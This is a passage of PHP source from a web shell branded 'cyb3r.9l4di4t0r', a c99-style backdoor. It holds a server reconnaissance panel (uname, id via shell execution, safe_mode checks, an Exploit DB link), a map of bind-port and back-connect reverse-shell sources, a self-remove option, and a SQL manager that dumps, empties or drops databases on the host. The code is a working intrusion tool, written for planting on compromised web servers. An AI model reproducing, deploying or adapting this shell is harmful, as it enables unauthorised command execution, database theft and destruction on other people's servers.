if (!function_exists("tabsort")) {function tabsort($a,$b) {global $v; return strnatcmp($a[$v], $b[$v]);}}

if (!function_exists("view_perms"))

{

function view_perms($mode)

{

 if (($mode & 0xC000) === 0xC000) {$type = "s";}

 elseif (($mode & 0x4000) === 0x4000) {$type = "d";}

 elseif (($mode & 0xA000) === 0xA000) {$type = "l";}

 elseif (($mode & 0x8000) === 0x8000) {$type = "-";}

 elseif (($mode & 0x6000) === 0x6000) {$type = "b";}

 elseif (($mode & 0x2000) === 0x2000) {$type = "c";}

 elseif (($mode & 0x1000) === 0x1000) {$type = "p";}

 else {$type = "?";}



 $owner["read"] = ($mode & 00400)?"r":"-";

 $owner["write"] = ($mode & 00200)?"w":"-";

 $owner["execute"] = ($mode & 00100)?"x":"-";

 $group["read"] = ($mode & 00040)?"r":"-";

 $group["write"] = ($mode & 00020)?"w":"-";

 $group["execute"] = ($mode & 00010)?"x":"-";

 $world["read"] = ($mode & 00004)?"r":"-";

 $world["write"] = ($mode & 00002)? "w":"-";

 $world["execute"] = ($mode & 00001)?"x":"-";



 if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}

 if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}

 if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}



 return $type.join("",$owner).join("",$group).join("",$world);

}

}

if (!function_exists("posix_getpwuid") and !in_array("posix_getpwuid",$disablefunc)) {function posix_getpwuid($uid) {return FALSE;}}

if (!function_exists("posix_getgrgid") and !in_array("posix_getgrgid",$disablefunc)) {function posix_getgrgid($gid) {return FALSE;}}

if (!function_exists("posix_kill") and !in_array("posix_kill",$disablefunc)) {function posix_kill($gid) {return FALSE;}}

if (!function_exists("parse_perms"))

{

function parse_perms($mode)

{

 if (($mode & 0xC000) === 0xC000) {$t = "s";}

 elseif (($mode & 0x4000) === 0x4000) {$t = "d";}

 elseif (($mode & 0xA000) === 0xA000) {$t = "l";}

 elseif (($mode & 0x8000) === 0x8000) {$t = "-";}

 elseif (($mode & 0x6000) === 0x6000) {$t = "b";}

 elseif (($mode & 0x2000) === 0x2000) {$t = "c";}

 elseif (($mode & 0x1000) === 0x1000) {$t = "p";}

 else {$t = "?";}

 $o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0; $o["x"] = ($mode & 00100) > 0;

 $g["r"] = ($mode & 00040) > 0; $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0;

 $w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0;

 return array("t"=>$t,"o"=>$o,"g"=>$g,"w"=>$w);

}

}

if (!function_exists("parsesort"))

{

function parsesort($sort)

{

 $one = intval($sort);

 $second = substr($sort,-1);

 if ($second != "d") {$second = "a";}

 return array($one,$second);

}

}

if (!function_exists("view_perms_color"))

{

function view_perms_color($o)

{

 if (!is_readable($o)) {return "<font color=red>".view_perms(fileperms($o))."</font>";}

 elseif (!is_writable($o)) {return "<font color=white>".view_perms(fileperms($o))."</font>";}

 else {return "<font color=green>".view_perms(fileperms($o))."</font>";}

}

}

if (!function_exists("cyb3rgetsource"))

{

function cyb3rgetsource($fn)

{

 global $cyb3r_sourcesurl;

 $array = array(

  "cyb3r_bindport.pl" => "cyb3r_bindport_pl.txt",

  "cyb3r_bindport.c" => "cyb3r_bindport_c.txt",

  "cyb3r_backconn.pl" => "cyb3r_backconn_pl.txt",

  "cyb3r_backconn.c" => "cyb3r_backconn_c.txt",

  "cyb3r_datapipe.pl" => "cyb3r_datapipe_pl.txt",

  "cyb3r_datapipe.c" => "cyb3r_datapipe_c.txt",

 );

}

}

if (!function_exists("mysql_dump"))

{

function mysql_dump($set)

{

 global $shver;

 $sock = $set["sock"];

 $db = $set["db"];

 $print = $set["print"];

 $nl2br = $set["nl2br"];

 $file = $set["file"];

 $add_drop = $set["add_drop"];

 $tabs = $set["tabs"];

 $onlytabs = $set["onlytabs"];

 $ret = array();

 $ret["err"] = array();

 if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}

 if (empty($db)) {$db = "db";}

 if (empty($print)) {$print = 0;}

 if (empty($nl2br)) {$nl2br = 0;}

 if (empty($add_drop)) {$add_drop = TRUE;}

 if (empty($file))

 {

  $file = $tmpdir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";

 }

 if (!is_array($tabs)) {$tabs = array();}

 if (empty($add_drop)) {$add_drop = TRUE;}

 if (sizeof($tabs) == 0)

 {

  // retrive tables-list

  $res = mysql_query("SHOW TABLES FROM ".$db, $sock);

  if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}

 }

 $out = "# Dumped by cyb3rell.SQL v. ".$shver."

# Home page: http://ccteam.ru

#

# Host settings:

# MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."

# Date: ".date("d.m.Y H:i:s")."

# DB: \"".$db."\"

#---------------------------------------------------------

";

 $c = count($onlytabs);

 foreach($tabs as $tab)

 {

  if ((in_array($tab,$onlytabs)) or (!$c))

  {

   if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}

   // recieve query for create table structure

   $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);

   if (!$res) {$ret["err"][] = mysql_smarterror();}

   else

   {

    $row = mysql_fetch_row($res);

    $out .= $row["1"].";\n\n";

    // recieve table variables

    $res = mysql_query("SELECT * FROM `$tab`", $sock);

    if (mysql_num_rows($res) > 0)

    {

     while ($row = mysql_fetch_assoc($res))

     {

      $keys = implode("`, `", array_keys($row));

      $values = array_values($row);

      foreach($values as $k=>$v) {$values[$k] = addslashes($v);}

      $values = implode("', '", $values);

      $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";

      $out .= $sql;

     }

    }

   }

  }

 }

 $out .= "#---------------------------------------------------------------------------------\n\n";

 if ($file)

 {

  $fp = fopen($file, "w");

  if (!$fp) {$ret["err"][] = 2;}

  else

  {

   fwrite ($fp, $out);

   fclose ($fp);

  }

 }

 if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}

 return $out;

}

}

if (!function_exists("mysql_buildwhere"))

{

function mysql_buildwhere($array,$sep=" and",$functs=array())

{

 if (!is_array($array)) {$array = array();}

 $result = "";

 foreach($array as $k=>$v)

 {

  $value = "";

  if (!empty($functs[$k])) {$value .= $functs[$k]."(";}

  $value .= "'".addslashes($v)."'";

  if (!empty($functs[$k])) {$value .= ")";}

  $result .= "`".$k."` = ".$value.$sep;

 }

 $result = substr($result,0,strlen($result)-strlen($sep));

 return $result;

}

}

if (!function_exists("mysql_fetch_all"))

{

function mysql_fetch_all($query,$sock)

{

 if ($sock) {$result = mysql_query($query,$sock);}

 else {$result = mysql_query($query);}

 $array = array();

 while ($row = mysql_fetch_array($result)) {$array[] = $row;}

 mysql_free_result($result);

 return $array;

}

}

if (!function_exists("mysql_smarterror"))

{

function mysql_smarterror($type,$sock)

{

 if ($sock) {$error = mysql_error($sock);}

 else {$error = mysql_error();}

 $error = htmlspecialchars($error);

 return $error;

}

}

if (!function_exists("mysql_query_form"))

{

function mysql_query_form()

{

 global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;

 if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}

 if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}

 if ((!$submit) or ($sql_act))

 {

  echo "<table border=0><tr><td><form name=\"cyb3r_sqlquery\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\">&nbsp;<input type=submit value=\"No\"></form></td>";

  if ($tbl_struct)

  {

   echo "<td valign=\"top\"><b>Fields:</b><br>";

   foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "» <a href=\"#\" onclick=\"document.cyb3r_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}

   echo "</td></tr></table>";

  }

 }

 if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}

}

}

if (!function_exists("mysql_create_db"))

{

function mysql_create_db($db,$sock="")

{

 $sql = "CREATE DATABASE `".addslashes($db)."`;";

 if ($sock) {return mysql_query($sql,$sock);}

 else {return mysql_query($sql);}

}

}

if (!function_exists("mysql_query_parse"))

{

function mysql_query_parse($query)

{

 $query = trim($query);

 $arr = explode (" ",$query);

 /*array array()

 {

  "METHOD"=>array(output_type),

  "METHOD1"...

  ...

 }

 if output_type == 0, no output,

 if output_type == 1, no output if no error

 if output_type == 2, output without control-buttons

 if output_type == 3, output with control-buttons

 */

 $types = array(

  "SELECT"=>array(3,1),

  "SHOW"=>array(2,1),

  "DELETE"=>array(1),

  "DROP"=>array(1)

 );

 $result = array();

 $op = strtoupper($arr[0]);

 if (is_array($types[$op]))

 {

  $result["propertions"] = $types[$op];

  $result["query"]  = $query;

  if ($types[$op] == 2)

  {

   foreach($arr as $k=>$v)

   {

    if (strtoupper($v) == "LIMIT")

    {

     $result["limit"] = $arr[$k+1];

     $result["limit"] = explode(",",$result["limit"]);

     if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}

     unset($arr[$k],$arr[$k+1]);

    }

   }

  }

 }

 else {return FALSE;}

}

}

if (!function_exists("cyb3rfsearch"))

{

function cyb3rfsearch($d)

{

 global $found;

 global $found_d;

 global $found_f;

 global $search_i_f;

 global $search_i_d;

 global $a;

 if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}

 $h = opendir($d);

 while (($f = readdir($h)) !== FALSE)

 {

  if($f != "." && $f != "..")

  {

   $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== FALSE) || ($a["name_regexp"] and ereg($a["name"],$f));

   if (is_dir($d.$f))

   {

    $search_i_d++;

    if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}

    if (!is_link($d.$f)) {cyb3rfsearch($d.$f);}

   }

   else

   {

    $search_i_f++;

    if ($bool)

    {

     if (!empty($a["text"]))

     {

      $r = @file_get_contents($d.$f);

      if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}

      if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}

      if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}

      else {$bool = strpos(" ".$r,$a["text"],1);}

      if ($a["text_not"]) {$bool = !$bool;}

      if ($bool) {$found[] = $d.$f; $found_f++;}

     }

     else {$found[] = $d.$f; $found_f++;}

    }

   }

  }

 }

 closedir($h);

}

}

if ($act == "gofile") {if (is_dir($f)) {$act = "ls"; $d = $f;} else {$act = "f"; $d = dirname($f); $f = basename($f);}}

//Sending headers

@ob_start();

@ob_implicit_flush(0);

function onphpshutdown()

{

 global $gzipencode,$ft;

 if (!headers_sent() and $gzipencode and !in_array($ft,array("img","download","notepad")))

 {

  $v = @ob_get_contents();

  @ob_end_clean();

  @ob_start("ob_gzHandler");

  echo $v;

  @ob_end_flush();

 }

}

function cyb3rexit()

{

 onphpshutdown();

 exit;

}


if (empty($tmpdir))

{

 $tmpdir = ini_get("upload_tmp_dir");

 if (is_dir($tmpdir)) {$tmpdir = "/tmp/";}

}

$tmpdir = realpath($tmpdir);

$tmpdir = str_replace("\\",DIRECTORY_SEPARATOR,$tmpdir);

if (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}

if (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}

else {$tmpdir_logs = realpath($tmpdir_logs);}

if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")

{

 $safemode = TRUE;

 $hsafemode = "<font color=green>ON (secure)</font>";
  $sfmode = "<font color=green><b>ON (secure)</b></font>";
}

else {$safemode = FALSE; $hsafemode = "<font color=red>OFF (not secure)</font>"; $sfmode = "<font color=red><b>OFF (not secure)</b></font>";}

$v = @ini_get("open_basedir");

if ($v or strtolower($v) == "on") {$openbasedir = TRUE; $hopenbasedir = "<font color=red>".$v."</font>";}

else {$openbasedir = FALSE; $hopenbasedir = "<font color=green>OFF (not secure)</font>";}

$sort = htmlspecialchars($sort);

if (empty($sort)) {$sort = $sort_default;}

$sort[1] = strtolower($sort[1]);

$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");

if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}

$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),'[<a href="http://www.google.com/search?q='.$kernel.' '. $release.'" target=_blank ><b><u><font color="red">Google</font></u></b></a>]',htmlspecialchars($DISP_SERVER_SOFTWARE));

@ini_set("highlight.bg",$highlight_bg); //FFFFFF

@ini_set("highlight.comment",$highlight_comment); //#FF8000

@ini_set("highlight.default",$highlight_default); //#0000BB

@ini_set("highlight.html",$highlight_html); //#000000

@ini_set("highlight.keyword",$highlight_keyword); //#007700

@ini_set("highlight.string",$highlight_string); //#DD0000

if (!is_array($actbox)) {$actbox = array();}

$dspact = $act = htmlspecialchars($act);

$disp_fullpath = $ls_arr = $notls = null;

$ud = urlencode($d);

?>

<center>
<TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#15354c borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0">
<tr>
<td><center><p><a href="?"><img src="http://s15.postimage.org/5oskuq363/image.png" height="68px" width="66px" border="0px"/></a><br />cyb3r.9l4di4t0r<br /><?php echo $shver; ?> </p></center></td>
<td width="90%">
<TABLE style="BORDER-COLLAPSE: collapse" borderColorDark=#c0c0c0 cellPadding=3 width="100%" bgColor=#15354c borderColorLight=#c0c0c0 border=0>
 <tr>
    <td width="9%" ><b>Software :</b></td>
    <td ><b><?php echo $DISP_SERVER_SOFTWARE.' [<a href="'.$expltlink.'" target=_blank><b><u><font color="yellow">Exploit DB</font></u></b></a>]'; ?></b></td>
    <td width="9%"><?php echo "<a href=\"".$surl."act=serverinfo\" ><b><u>Server</u> I.P.</b></a>"?></td>
    <td width="9%"><b><?php echo getenv('SERVER_ADDR'); ?></b></td>
 </tr>
 <tr>
    <td width="9%" ><?php echo "<a href=\"".$surl."act=security\" ><b><u>Uname-a</u> :</b></a>"?></td>
    <td ><b><?php echo wordwrap(php_uname(),90,"<br>",1); ?></b></td>
    <td width="9%"><?php echo "<a href=\"".$surl."act=clientinfo\" ><b><u>Client</u> I.P.</b></a>"?></td>
    <td width="9%"><b><?php echo $_SERVER['REMOTE_ADDR']; ?></b></td>
 </tr>
 <tr>
    <td width="9%" ><?php echo "<a href=\"".$surl."act=processes\" ><b><u>Username</u> :</b></a>"?></td>
    <td ><b><?php if (!$win) {echo wordwrap(myshellexec("id"),90,"<br>",1);} else {echo get_current_user();} ?></b></td>
    <td width="9%"><?php echo "<a href=\"".$surl."act=systeminfo\" ><b><u>Sys</u>tem<u>info</u></b></a>"?></td>
    <td width="9%"></td>
 </tr>
 <tr>
    <td width="9%" ><b>Safe Mode :</b></td>
    <td ><b><?php echo $hsafemode; ?></b></td>
    <td width="9%"><b></b></td>
    <td width="9%"></td>
 </tr>
 <tr>
    <td width="9%" ><b>Directory :</b></td>
    <td ><b>
	<?php

$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);

if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}

$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);

if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}

$d = str_replace("\\\\","\\",$d);

$dispd = htmlspecialchars($d);

$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));

$i = 0;

foreach($pd as $b)

{

 $t = "";

 $j = 0;

 foreach ($e as $r)

 {

  $t.= $r.DIRECTORY_SEPARATOR;

  if ($j == $i) {break;}

  $j++;

 }

 echo "<a href=\"".$surl."act=ls&d=".urlencode($t)."&sort=".$sort."\"><b>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</b></a>";

 $i++;

}

echo "&nbsp;&nbsp;&nbsp;";

if (is_writable($d))

{

 $wd = TRUE;

 $wdt = "<font color=green>[ ok ]</font>";

 echo "<b><font color=green>".view_perms(fileperms($d))."</font></b>";

}

else

{

 $wd = FALSE;

 $wdt = "<font color=red>[ Read-Only ]</font>";

 echo "<b>".view_perms_color($d)."</b>";

}
 ?>
 </b></td>
    <td width="9%"><?php echo "<a href=\"".$surl."act=selfremove\" ><b><font color='orange'>Self <u>Remove</u></font></b></a>"?></td>
    <td width="9%"></td>
 </tr>
 <tr>
    <td width="9%" ><b>Free Space :</b></td>
    <td ><b>
	<?php if (is_callable("disk_free_space"))

{

 $free = disk_free_space($d);

 $total = disk_total_space($d);

 if ($free === FALSE) {$free = 0;}

 if ($total === FALSE) {$total = 0;}

 if ($free < 0) {$free = 0;}

 if ($total < 0) {$total = 0;}

 $used = $total-$free;

 $free_percent = round(100/($total/$free),2);

 echo "<b>".view_size($free)." of ".view_size($total)." (".$free_percent."%)</b>";

}?>
    </b></td>
    <td width="9%"><?php echo "<a href=\"".$surl."act=feedback\" ><b>Feed<u>back</u></b></a>"?></td>
    <td width="9%"></td>
 </tr>
 <tr>
    <td width="9%" ><b>Drives :</b></td>
    <td ><b>
	<?php $letters = "";

if ($win)

{

 $v = explode("\\",$d);

 $v = $v[0];

 foreach (range("a","z") as $letter)

 {

  $bool = $isdiskette = in_array($letter,$safemode_diskettes);

  if (!$bool) {$bool = is_dir($letter.":\\");}

  if ($bool)

  {

   $letters .= "<a href=\"".$surl."act=ls&d=".urlencode($letter.":\\")."\"".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">[ ";

   if ($letter.":" != $v) {$letters .= $letter;}

   else {$letters .= "<font color=green>".$letter."</font>";}

   $letters .= " ]</a> ";

  }

 }

 if (!empty($letters)) {echo $letters."<br>";}
}
 ?></b></td>
    <td width="9%"><a href="<?php echo $self.'?logout'?>"><b><font color='green'>I'm <u>Out</u> !</font></b></a></td>
    <td width="9%"></td>
 </tr>

 </table>
</td>

</tr>
</table>

<TABLE style="BORDER-COLLAPSE: collapse" height="1" cellSpacing=0 borderColorDark=#c0c0c0 cellPadding=5 width="100%" bgColor=#15354c borderColorLight=#c0c0c0 border=1>
<tr><td width="100%" valign="top">
            ADMIN: <?php echo $_SERVER['SERVER_ADMIN'];?> <font color="silver">|</font>
            PHP : <?php echo "<a href=\"".$surl."act=phpinfo\" target=\"_blank\"><b><u>".$phpVersion."</u></b></a>"?> <font color="silver">|</font>
            Curl : <?php echo function_exists('curl_version')?("<font color='red'>Enabled</font>"):("Disabled"); ?>  <font color="silver">|</font>
            Oracle : <?php echo function_exists('ocilogon')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver">|</font>
            MySQL : <?php  echo function_exists('mysql_connect')?("<font color='red'>Enabled</font>"):("Disabled");?> <font color="silver">|</font>
            MSSQL : <?php echo function_exists('mssql_connect')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver">|</font>
            PostgreSQL : <?php echo function_exists('pg_connect')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver">|</font>
            Disable functions : <?php getDisabledFunctions(); ?>	
            </td></tr>
</table>

<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#c0c0c0 cellPadding=5 width="100%" bgColor=#15354c borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0">
<tr><td width="100%" valign="top">
   <?php
    if (count($quicklaunch) > 0)

    {

     foreach($quicklaunch as $item)

     {

      $item[1] = str_replace("%d",urlencode($d),$item[1]);

      $item[1] = str_replace("%sort",$sort,$item[1]);

      $v = realpath($d."..");

      if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}

      $item[1] = str_replace("%upd",urlencode($v),$item[1]);

      echo "<a href=\"".$item[1]."\">".$item[0]."</a>&nbsp;&nbsp;&nbsp;&nbsp;";

     }

    }?>
   </td>
  </tr>
 </table><br>
<?php

if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#15354c borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">".$donated_html."</td></tr></table><br>";}

echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#15354c borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">";

if ($act == "") {$act = $dspact = "ls";}

if ($act == "sql")

{

 $sql_surl = $surl."act=sql";

 if ($sql_login)  {$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);}

 if ($sql_passwd) {$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);}

 if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}

 if ($sql_port)   {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}

 if ($sql_db)     {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}

 $sql_surl .= "&";

 ?><h3>Attention! SQL-Manager is <u>NOT</u> ready module! Don't reports bugs.</h3>
 <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#15354c borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><td width="100%" height="1" colspan="2" valign="top"><center><?php

 if ($sql_server)

 {

  $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);

  $err = mysql_smarterror();

  @mysql_select_db($sql_db,$sql_sock);

  if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}

 }

 else {$sql_sock = FALSE;}

 echo "<b>SQL Manager:</b><br>";

 if (!$sql_sock)

 {

  if (!$sql_server) {echo "NO CONNECTION";}

  else {echo "<center><b>Can't connect</b></center>"; echo "<b>".$err."</b>";}

 }

 else

 {

  $sqlquicklaunch = array();

  $sqlquicklaunch[] = array("Index",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");

  $sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl));

  $sqlquicklaunch[] = array("Server-status",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus");

  $sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");

  $sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");

  $sqlquicklaunch[] = array("Logout",$surl."act=sql");

  echo "<center><b>MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")</b><br>";

  if (count($sqlquicklaunch) > 0) {foreach($sqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\"><b>".$item[0]."</b></a> ] ";}}

  echo "</center>";

 }

 echo "</td></tr><tr>";

 if (!$sql_sock) {?>
 <td width="28%" height="100" valign="top"><center><font size="5"> i </font></center>
  <li>If login is null, login is owner of process.<li>
  If host is null, host is localhost</b><li>If port is null, port is 3306 (default)</td><td width="90%" height="1" valign="top"><TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0><tr><td>&nbsp;<b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Password</b>&nbsp;</td><td><b>Database</b>&nbsp;</td></tr><form action="<?php echo $surl; ?>" method="POST"><input type="hidden" name="act" value="sql"><tr><td><input type="text" name="sql_login" value="root" maxlength="64"></td><td><input type="password" name="sql_passwd" value="" maxlength="64"></td><td><input type="text" name="sql_db" value="" maxlength="64"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type="text" name="sql_server" value="localhost" maxlength="64"></td><td><input type="text" name="sql_port" value="3306" maxlength="6" size="3"></td><td><input type="submit" value="Connect"></td></tr><tr><td></td></tr></form></table>
  </td>
  <?php }

 else
{

  //Start left panel

  if (!empty($sql_db))
  {

   ?><td width="25%" height="100%" valign="top"><a href="<?php echo $surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"><b>Home</b></a><hr size="1" noshade><?php

   $result = mysql_list_tables($sql_db);

   if (!$result) {echo mysql_smarterror();}

   else

   {

    echo "---[ <a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a> ]---<br>";

    $c = 0;

    while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>»&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>"; mysql_free_result($count); $c++;}

    if (!$c) {echo "No tables found in database.";}

   }

  }

  else

  {

   ?><td width="1" height="100" valign="top"><a href="<?php echo $sql_surl; ?>"><b>Home</b></a><hr size="1" noshade><?php

   $result = mysql_list_dbs($sql_sock);

   if (!$result) {echo mysql_smarterror();}

   else

   {

    ?><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><select name="sql_db"><?php

    $c = 0;

    $dbs = "";

    while ($row = mysql_fetch_row($result)) {$dbs .= "<option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= ">".$row[0]."</option>"; $c++;}

    echo "<option value=\"\">Databases (".$c.")</option>";

    echo $dbs;

   }

   ?></select><hr size="1" noshade>Please, select database<hr size="1" noshade><input type="submit" value="Go"></form><?php

  }

  //End left panel

  echo "</td><td width=\"100%\" height=\"1\" valign=\"top\">";

  //Start center panel

  $diplay = TRUE;

  if ($sql_db)

  {

   if (!is_numeric($c)) {$c = 0;}

   if ($c == 0) {$c = "no";}

   echo "<hr size=\"1\" noshade><center><b>There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").<br>";

   if (count($dbquicklaunch) > 0) {foreach($dbsqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";}}

   echo "</b></center>";

   $acts = array("","dump");

   if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}

   elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_act = "query";}

   elseif ($sql_act == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}

   elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}

   elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}

   elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}

   elseif ($sql_act == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}

